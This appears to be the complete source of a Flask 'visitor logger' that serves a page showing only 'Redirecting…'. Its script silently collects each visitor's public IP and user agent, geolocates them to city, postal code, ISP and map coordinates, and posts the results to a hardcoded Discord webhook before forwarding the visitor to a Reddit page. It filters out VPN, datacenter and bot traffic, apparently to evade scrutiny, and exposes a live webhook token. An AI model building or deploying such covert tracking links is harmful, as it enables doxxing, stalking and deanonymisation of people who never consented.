# main.pyk Made by Slick7qa copyright intact
"""
Visitor logger (final):
 - Browser-based public IP collection via api.ipify (real client IP)
 - ipapi.co first, ipwho.is fallback enrichment (no API keys)
 - enhanced VPN/proxy/datacenter detection (org keywords + PTR reverse-DNS)
 - debug logging to file for tuning (ip, org, ptr_host, vpn_flag)
 - bot blocking, per-IP cooldown, single Discord embed (ALERT style)
 - redirects real visitors to REDIRECT_URL
"""

from flask import Flask, request, redirect, jsonify, abort
import requests
from datetime import datetime
import threading
import time
import socket
import os

app = Flask(__name__)

# ========== CONFIG ==========
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1430264733193207848/5fOooaQ3VYQePvd7m0ZR6hZsYPW0ML6pk9jZ5wMcin7JkyuHHVg_IQicnDqr18NWvsQh"
REDIRECT_URL = "https://www.reddit.com/r/footballhighlights/"
COOLDOWN_SECONDS = 10  # seconds between webhooks from same IP (0 = immediate repeats allowed)
DEBUG_LOG_PATH = os.getenv("VISITOR_DEBUG_LOG", "visitor_debug.log")

# UA bot keywords
BOT_UA_KEYWORDS = [
    "googlebot","bingbot","slurp","duckduckbot","baiduspider",
    "yandexbot","sogou","exabot","facebot","facebookexternalhit",
    "ia_archiver","python-requests","go-http-client","curl","wget"
]

# datacenter / cloud provider substrings
CLOUD_ORG_KEYWORDS = [
    "amazon","aws","google cloud","google","microsoft","azure",
    "digitalocean","hetzner","linode","ovh","oracle","cloudflare",
    "rackspace","vultr","scaleway","kimsufi","contabo"
]

# expanded VPN provider keywords (consumer VPN names)
VPN_KEYWORDS_EXPANDED = [
    "vpn","proxy","private internet access","pia","nordvpn","protonvpn",
    "mullvad","surfshark","expressvpn","windscribe","hide.me","hidemyass",
    "torguard","vpnbook","perfect-privacy","purevpn","ipvanish",
    "vyprvpn","hotspotshield","privatevpn","vpn.ht","cyberghost","zenmate",
    "tunnelbear","anchorfree","psiphon","proton"
]

# cooldown tracking
last_sent_by_ip = {}
def clear_last_sent():
    global last_sent_by_ip
    last_sent_by_ip = {}
    threading.Timer(86400, clear_last_sent).start()
clear_last_sent()

# ========== UTIL ==========
def now_gmt():
    return datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S GMT")

def is_bot_ua(ua: str) -> bool:
    if not ua:
        return False
    ua_l = ua.lower()
    return any(k in ua_l for k in BOT_UA_KEYWORDS)

# ========== IP ENRICH ==========
def fetch_ipapi(ip: str) -> dict:
    try:
        headers = {"User-Agent": "Mozilla/5.0 (compatible; VisitorLogger/1.0)"}
        r = requests.get(f"https://ipapi.co/{ip}/json/", headers=headers, timeout=6)
        if r.status_code == 200:
            return r.json() or {}
    except Exception:
        pass
    return {}

def fetch_ipwho_is(ip: str) -> dict:
    try:
        r = requests.get(f"https://ipwho.is/{ip}", timeout=6)
        if r.status_code == 200:
            data = r.json() or {}
            if data.get("success", True) is not False:
                return data
    except Exception:
        pass
    return {}

def enrich_ip(ip: str) -> dict:
    details = fetch_ipapi(ip)
    source = "ipapi"
    if not details or (not details.get("city") and not details.get("org") and not details.get("latitude")):
        fb = fetch_ipwho_is(ip)
        if fb:
            details = {
                "city": fb.get("city"),
                "region": fb.get("region"),
                "country_name": fb.get("country"),
                "postal": fb.get("postal") or fb.get("postal_code"),
                "org": fb.get("org") or fb.get("isp") or fb.get("connection", {}).get("asn_org"),
                "latitude": fb.get("latitude") or fb.get("lat"),
                "longitude": fb.get("longitude") or fb.get("lon"),
                "raw_fallback": fb
            }
            source = "ipwho.is"
    # normalize lat/lon
    try:
        lat = details.get("latitude") or details.get("lat") or 0
        lon = details.get("longitude") or details.get("lon") or 0
        details["latitude"] = float(lat) if lat not in (None, "", 0) else 0
        details["longitude"] = float(lon) if lon not in (None, "", 0) else 0
    except Exception:
        details["latitude"] = 0
        details["longitude"] = 0
    details.setdefault("city", None)
    details.setdefault("region", None)
    details.setdefault("country_name", None)
    details.setdefault("postal", None)
    details.setdefault("org", None)
    details.setdefault("security", {})
    details["_source"] = source
    return details

# ========== VPN/PROXY DETECTION (ENHANCED) ==========
def reverse_dns_ptr(ip: str, timeout_sec: float = 0.45) -> str:
    try:
        orig = socket.getdefaulttimeout()
        socket.setdefaulttimeout(timeout_sec)
        try:
            host = socket.gethostbyaddr(ip)[0]
        finally:
            socket.setdefaulttimeout(orig)
        return host
    except Exception:
        return ""

def detect_vpn_or_proxy(details: dict, ip: str = None) -> bool:
    sec = details.get("security") or {}
    if isinstance(sec, dict) and (sec.get("vpn") or sec.get("proxy") or sec.get("hosting")):
        _log_debug(ip, details.get("org"), "security-flag", True)
        return True

    raw = details.get("raw_fallback") or {}
    if isinstance(raw, dict):
        if raw.get("threat"):
            _log_debug(ip, details.get("org"), str(raw.get("threat")), True)
            return True
        typ = raw.get("type") or raw.get("connection", {}).get("type")
        if typ and str(typ).lower() in ("hosting", "vpn", "proxy"):
            _log_debug(ip, details.get("org"), f"type:{typ}", True)
            return True

    org = (details.get("org") or "") or ""
    org_l = org.lower()
    for kw in VPN_KEYWORDS_EXPANDED + CLOUD_ORG_KEYWORDS:
        if kw in org_l:
            _log_debug(ip, org, "org-keyword", True)
            return True

    ptr = ""
    try:
        if ip:
            ptr = reverse_dns_ptr(ip, timeout_sec=0.45)
            if ptr:
                ptr_l = ptr.lower()
                ptr_indicators = [
                    "vpn","proxy","exit","node","tor","nat","pool","static",
                    "client","dialup","dynamic","dsl","ppp","mobile"
                ]
                if any(ind in ptr_l for ind in ptr_indicators):
                    _log_debug(ip, org, ptr, True)
                    return True
    except Exception:
        pass

    _log_debug(ip, org, ptr or "none", False)
    return False

# ========== DEBUG LOGGING ==========
def _log_debug(ip: str, org: str, ptr_host: str, vpn_flag: bool):
    try:
        line = f"{now_gmt()} | ip={ip} | org={org or 'None'} | ptr={ptr_host or 'None'} | vpn={vpn_flag}\n"
        with open(DEBUG_LOG_PATH, "a", encoding="utf-8") as f:
            f.write(line)
    except Exception:
        pass

# ========== MAP & DISCORD ==========
def build_map_url(details: dict) -> str:
    lat = details.get("latitude", 0)
    lon = details.get("longitude", 0)
    if lat and lon:
        return f"https://www.google.com/maps?q={lat},{lon}"
    parts = [p for p in [details.get("city"), details.get("region"), details.get("country_name")] if p]
    if parts:
        q = "+".join("".join(str(x).split()) for x in parts)
        return f"https://www.google.com/maps/search/{q}"
    return "https://www.google.com/maps"

def send_discord_embed(info: dict) -> bool:
    color_red = 15158332
    map_url = info.get("map_url", "https://www.google.com/maps")
    embed_payload = {
        "username": "🚨 Visitor Alert",
        "embeds": [{
            "title": f"🚨 New Visitor — {info.get('city') or 'Unknown'}",
            "url": map_url,
            "description": f"**IP:** `{info.get('ip')}`",
            "color": color_red,
            "fields": [
                {"name": "Location", "value": f"{info.get('city') or 'Unknown'}, {info.get('region') or 'Unknown'} ({info.get('country') or 'Unknown'})", "inline": False},
                {"name": "Postal", "value": info.get('postal') or "Unknown", "inline": True},
                {"name": "ISP / Org", "value": info.get('org') or "Unknown ISP", "inline": True},
                {"name": "VPN/Proxy", "value": "Yes 🚨" if info.get('vpn') else "No ✅", "inline": True},
                {"name": "Map", "value": f"[Open Map]({map_url})", "inline": False},
                {"name": "User Agent", "value": f"`{info.get('user_agent') or 'Unknown'}`", "inline": False},
                {"name": "Source", "value": info.get("_source") or "ipapi", "inline": True},
                {"name": "Time (UTC)", "value": info.get("time") or now_gmt(), "inline": True}
            ]
        }]
    }
    try:
        r = requests.post(DISCORD_WEBHOOK_URL, json=embed_payload, timeout=6)
        return 200 <= r.status_code < 300
    except Exception:
        return False

# ========== ROUTES ===========
@app.route('/')
def root():
    html = f"""
    <!doctype html>
    <html>
      <head><meta charset="utf-8"><title>Redirecting…</title></head>
      <body>
        <script>
          fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(d => {{
              try {{
                fetch('/log', {{
                  method: 'POST',
                  headers: {{'Content-Type': 'application/json'}},
                  body: JSON.stringify({{ ip: d.ip, ua: navigator.userAgent }})
                }});
              }} catch(e){{}}
              window.location.replace('{REDIRECT_URL}');
            }})
            .catch(() => {{ window.location.replace('{REDIRECT_URL}'); }});
        </script>
        <p>Redirecting…</p>
      </body>
    </html>
    """
    return html

@app.route('/log', methods=['POST'])
def log():
    try:
        data = request.get_json(force=True)
    except Exception:
        return jsonify({"error": "bad request"}), 400

    ip = data.get("ip")
    user_agent = data.get("ua") or request.headers.get("User-Agent", "Unknown")

    if not ip:
        return jsonify({"error": "no ip provided"}), 400

    # quick UA bot check -> 404
    if is_bot_ua(user_agent):
        abort(404)

    # cooldown check
    now_ts = time.time()
    last_ts = last_sent_by_ip.get(ip, 0)
    if COOLDOWN_SECONDS > 0 and (now_ts - last_ts) < COOLDOWN_SECONDS:
        return jsonify({"status": "cooldown"}), 200

    # enrich ip details
    details = enrich_ip(ip)

    # enhanced VPN/proxy detection (pass ip for PTR)
    vpn_flag = detect_vpn_or_proxy(details, ip=ip)
    if vpn_flag:
        abort(404)

    # prepare info
    info = {
        "ip": ip,
        "user_agent": user_agent,
        "city": details.get("city") or None,
        "region": details.get("region") or None,
        "country": details.get("country_name") or details.get("country") or None,
        "postal": details.get("postal") or None,
        "org": details.get("org") or None,
        "latitude": details.get("latitude") or 0,
        "longitude": details.get("longitude") or 0,
        "vpn": vpn_flag,
        "_source": details.get("_source"),
        "time": now_gmt()
    }
    info["map_url"] = build_map_url(details)

    # mark before sending
    last_sent_by_ip[ip] = now_ts

    # send embed (single)
    send_discord_embed(info)

    return jsonify({"status": "ok"}), 200

# ========== RUN ===========
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000, debug=False)
